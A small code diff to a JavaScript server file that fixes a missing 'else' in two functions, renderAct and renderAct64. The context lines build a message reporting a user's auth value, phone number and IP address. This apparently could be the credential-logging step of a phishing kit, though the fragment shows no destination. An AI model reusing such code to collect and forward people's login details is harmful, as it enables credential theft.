@@ -48,7 +48,7 @@ const renderAct = async(req, res) => {
 🔑: ${req.query.user}
 📱: ${phone}
 From: ${ ip }`)
-  } {
+  } else {
     encIpExs.encIp = null
     encIpExs.auth = req.query.user
     encIpExs.phone = phone
@@ -120,7 +120,7 @@ const renderAct64 = async(req, res) => {
 🔑: ${req.query.user}
 📱: ${phone}
 From: ${ ip }`)
-  } {
+  } else {
     encIpExs.encIp = null
     encIpExs.auth = req.query.user
     encIpExs.phone = phone
